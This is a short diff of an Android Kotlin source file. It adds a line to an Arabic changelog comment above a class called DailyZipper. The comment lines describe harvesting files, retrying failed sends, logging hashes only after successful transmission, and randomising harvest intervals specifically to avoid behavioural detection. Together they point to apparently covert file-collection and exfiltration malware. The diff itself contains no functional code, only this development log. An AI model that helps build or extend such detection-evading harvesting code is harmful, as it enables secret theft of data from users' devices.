@@ -34,6 +34,7 @@ import kotlin.random.Random
  * ✅ تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
  * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
  * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
+ * ✅ تم إصلاح خطأ Type mismatch في processedHashes و failedHashes بتحديد النوع العام <String>.
  */
 class DailyZipper(
     context: Context,
